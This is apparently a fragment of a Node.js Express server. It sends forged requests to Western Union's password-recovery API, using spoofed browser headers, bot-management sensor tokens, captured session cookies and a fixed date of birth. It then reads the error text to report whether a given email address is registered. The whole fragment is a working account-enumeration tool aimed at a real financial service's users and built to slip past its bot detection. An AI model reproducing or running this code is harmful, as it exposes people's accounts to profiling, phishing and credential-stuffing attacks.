V6VH9jpSoj9cYG8Cl_mUEdFHBk8HJ_9gkl=Qo_8veh0Py6Dgi3EGwjn5-OIxRFFPM-ug0F3_X-bEWSbwCFeZ94X4ejec3V84Vjmjyy87p5WVyUmgktVP9ZFU7VnU0K8cnWF1o6fjlFXueKqfWBFvejvgX4krVwFeRGbxCPEUR_NHbx9cPBeey=yeipqTxw0EetFEeDRKUoFd5U3uX3FuQLXSpGEPSKojijRSUUVSX58QQKF5RYOL_pmHrd=gDGmH1-9Ipl=Ty4eI3lXgbKbx12Z-Yx8vWG=PVOTsVFerY3RskW0e-BHPnoIrGppf97FUyKKiCdn-7iewCe3I1kXP3heGWjIHZFVulKLMVtk7p-kDVy0_VwFurBewY_=chvRHiwX-neFsQjbHQGF4V-OBRBtb-xFrWDFSk-EgUj=MVwFMuFXrVjtg6jvuVP3PYyq9ZdHKWtn-IPkvktVvS_bxVDeRDo0eeg=M5B==VOX5MKIPV4=qmF0lXxvPWtEuY6tUIpDnRpR5SKXC1p8blB=PlpfrQgfdFHJHrFG4V7m_I78cUKIuMkRHptGjeondlewH1-Fgwe8sZpF3P-mTeDTB0FFHQeve9_vHFGmQPKqw=B8cHK9mn4TMM_F04XyUohquXU=iYjFKQeeE1ynbipvuWQAu8DXuIPXSW3oc_-N7M-WtxO3gMSnTUKXc8eTGkF3KW-ITetnCBF8Hi2O5I2OcbheSnUD2YxfKfeIwhdygPK=UribZMkkcY6Xr3lX0lD3M3xUinDnsQjf7W-FU7BnCp00cQK9rROijeDfKYDylC-XfYfbx17FMBFbkBKkflFuURieC3AvGW69ElFylm-tgr_M5eDUe3jEHV6bPW-VT3tReiMEGkUmlY-mA9AFUDKXQyxnMB_Ful_bHRKyeleli1jN73hyGxP3uWHXfVWVwiwVli2rHp_X0eKbtktmKV-bZmK9wYwml8oNvk1mCMKyUpHFMG5FMBen-noQs-PX57Kn53WFGrdeUl_mCeGmjyeXn86mciitsXpv7BK3go7nlVrfweWDHIdyuMGmjlFjxYwxgoR8Spins_eFfi4DdlBbtwKxsm_=eYwW2m_-c8KEgJde0leEGWytHmgvTWif_W-RvJ_EGx63tx_LTQWnZ9pEgrp=Wl-krMpQCp20PyjmCpsnAV_FlKiEGl-UuelX0e6rEItvqYDFTV4XDi_bgKlbwnkfB3KmrV-SHiuEvKKI7KjmHIrTU2g8nUjDu6wksKH9chGAdWDm7MefSMUDleDWUWDHci20PyUXIreEi=3nZrKqlMKRK3WRdxdefVhnjI73HrBkcSDIP3KygV_8_X-=G5VnoBKXSMDEP=jJx1SyelFNvW4XgIhRBh2FHIjFuWB8r9wejrr3r0K=PRBuPfK8g1wFtlKsjUWyPoOTUCKigx7ewBGbtFKDWPz9fpwXt5_eu3hPgi7m_iw0PYMeMB-0cmKKlWw30=MDdW4mCBpXHiw=P9rWGWieg1eIw-pmQYGFUnh=i1xFsiVfOZQVCKtKuitFtldbbW0Fui3Nf1xWPRpXggWQJk2mePDXgke6TWw8cFDm4-p8TIy=IrKyUYDrxVxFulF3_eK9r0FVGxBQsI40JzGXqYyXnnZFgIMEPlsn4W7NG-hbF1S=e=4=lo6bZfeeqy6Nv-Sn50_eTW-tM1iv3rFN0I6DbKs8cCDesrDCeUqPckrylUomI1wHgY6bt-wXMp7EUD_EuQqEi1yXNRKqbRBDgM-=URknUpwn5yKye9tXMM_rDYSIEWzFGkpFgktn43Wb_Xwevxubt14vDbWFBewmsfw9CW-yUBYEg-turflXc9GEgi2O4BFfEuKbBW-8cp-FwZpWpWk3Q=-EUpvmGeGnEW43U3hffV7kjW-njz6ml2UVC3KFrI4VrYMeePUTTlGNrIx8AR-bgi-XTluYD3P=gyDKGeDWsPee1xSewoTEUrFF4V69CVrH_KwkTyOm_YDXEl-yu3_8SlKTP3G8QDZ3h-2FPM_9Di_RgJF8ck-=Hbw1Z0KfUKuQjXtTeYQNTzFTnUKRrp2mSppmznxewpWefYBFTyh=uGd8IRy8L4FyWxpNZyqm3NdGio4mw1PbD=DFgbGmHxe3EWpqUpHng5KvP5eFGFO_dWyXvotV3W2Fr0_rHsYFcJdFGFWvi1-esIjF-wGrtBeG5RFbHr-8Z0Skryhye3HVvWwe50K8so-Rr9pnsU5b_2DFsCDJwJ-mjWrEGW5DBV4qQR_nsihygFKeMpp3gSjb_5KXr0Bfs-OeGkx3tWwqulGFllGmllp8HI7=Mp0Nx=ReTWwyl7-fgI6btW-kfVyXgipFx9LFu6SXc8G=lY_Rvl_38eyyU3Zl59wcFetSDD_IlItnHIx8H1Ir_V4PuWtXgipX4BF80YDRN6rTg-O8tk4=gsKrEyO-MVpeQIpwdkGVjWj8SPeFPIjNsIwf3YwRco4WlIHrtx7cqYpyuqZee1zbHrG0UQQoH92FTPBRjWufV5y37KWRI0d8vwWXHk-QHfo3IMkelMtkNIpndbKFGCDe4KOrwpKFwBDksxwn5X7ml7q=c0sOjW2RsRBbDp3XTG5ecp-FP3w8=k-rZfDuGwZMi9r=I1QFClWXTWHvP0GX0-4Xl=-Ug3LR7p-ewB_mdldyGeWmCBQrHI0einlmIXrFQb_=lpyNMVY9Cpfvvl-IuWten=6XTeDyiCHn-1SFMpB6rW8fsDKLgI2OnetDe8_8H3z8EWM=59jmZIDeGWGnleUWlW4FLR_3WptfARYX0I480lFF50KTibH=H9w8D6QbDusbADKvZ9jNeWSrtW6=g=SrEMFfg4_QU=pFuifMCKHtfOiqfW2=PYG3ZVSkQPKDGF',
                    'x-nyupe9cs-b': '-jmwluk',
                    'x-nyupe9cs-c': 'AEBX1FtkAQAANVKsr9XWqwhAGGbiv939SwbIO0iwSp5fwGkPqt07bEXF7876',
                    'x-nyupe9cs-d': '0',
                    'x-nyupe9cs-uniquestatekey': 'ABxT61tkAQAAeh8HaJuM8DwqSGCHiTnQ3nZHbI6wfw3vtBg2ZPfQrYL8bykH',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36',
                    referer: 'https://www.westernunion.com/ES/EN/password-recovery.html',
                    origin: 'https://www.westernunion.com',
                    // cookie: 'AKCountry=TW; AKZip=; AKRegioncode=; AKCity=TAIPEI; AKAreacode=; AKCounty=; WUCountryCookie_=ES; AK_TLS_Version=tls1.2; resolution_height=800; resolution_width=1280; is_tablet=false; is_mobile=false; BIGipServerwudispatcher.westernunion.com=570502410.36895.0000; SERVER_COOKIE=R4; AMCVS_AACD3BC75245B4940A490D4D%40AdobeOrg=1; _abck=j7z8ri4f0kgkerkhpqge_1932; cachestatus=enabled; s_cc=true; user_txn_state=0:1530512033550; kampyle_userid=36ef-d12a-aad5-37a9-6ce6-0dba-fcd1-9b5b; cd_user_id=16459a0520032e-08275ab80f343b-47e1039-1fa400-16459a05201102f; QuantumMetricUserID=21eb5d6693cb92e3d58c7d611cfffd8d; QuantumMetricSessionID=f930c8f10eb29292ec9bdf652e3146a5; PathContent=/content/wucom/base/es/en; s_sq=%5B%5BB%5D%5D; s_error=C5000%2CC1172; s_t=1530531942099; WULanguageCookie_=EN; CookieOptIn=CKTXNL+CKPERF+CKMKTG; AMCV_AACD3BC75245B4940A490D4D%40AdobeOrg=1099438348%7CMCIDTS%7C17715%7CMCMID%7C00302567015786158761033064356710531361%7CMCAAMLH-1531116829%7C11%7CMCAAMB-1531140891%7CRKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y%7CMCOPTOUT-1530543291s%7CNONE%7CMCAID%7CNONE%7CMCSYNCSOP%7C411-17722%7CvVersion%7C2.1.0; channel_stack=password-recovery|login|password-recovery|login|password-recovery|login|password-recovery|login|password-recovery; JSESSIONID=7vzkdxn6gbej17vdv8nxktgsa; s_dfa=westernunionnewglobal; mbox=PC#e840942bc7134461bc6549949f9343a8.28_13#1593783919|session#72249bcb5e314b3d882dedd5f07ad242#1530540982; kampyleUserSession=1530539122828; kampyleUserSessionsCount=18; kampyleSessionPageCounter=1; kampyleUserPercentile=87.48893931071615; SessionId=web-c17c58b0-4d2f-4642-b721-b7cec2eedbf8; SessionDomain=www.westernunion.com; s_NewRepeateVar=1530540723114-Repeat; s_NewRepeatprop=1530540723115-Repeat; SessionInfo=1530540724502',
                    // 'content-length': '224',
                    'accept-language': 'en-US,en;q=0.9',
                    'accept-encoding': 'gzip, deflate, br',
                    accept: 'application/json',
                    'Content-Type': 'application/json'
                },
                body:
                {
                    bashPath: '/ES/EN/',
                    external_reference_no: '1',
                    gateway_customer: { email: req.query.email, date_of_birth: '1990-03-04' },
                    security:
                    {
                        session: { id: session },
                        client_ip: client_ip
                    }
                },
                json: true,
                jar: j
            };

            request(options, function (error, response, body) {
                console.log("getting register status...")
                if (error) throw new Error(error);

                console.log(body);
                var return_html = '<form action="/"><input type="submit" value="Return"></form>'
                if (body.error.message.includes("birth") || body.error.message.includes("date")) {
                    res.writeHead(200, { 'Content-Type': 'text/html' });
                    res.write("" + req.query.email + "  was registered" + return_html);
                    res.end();
                    // res.send("" + req.query.email + "  was registered");
                }
                else {
                    res.writeHead(200, { 'Content-Type': 'text/html' });
                    res.write("" + req.query.email + "  was not registered" + return_html);
                    res.end();
                    // res.send("" + req.query.email + "  was not registered");
                }


            });

            console.log("cookies", cookies);
            console.log(body);
        });
    });



})

module.exports = app;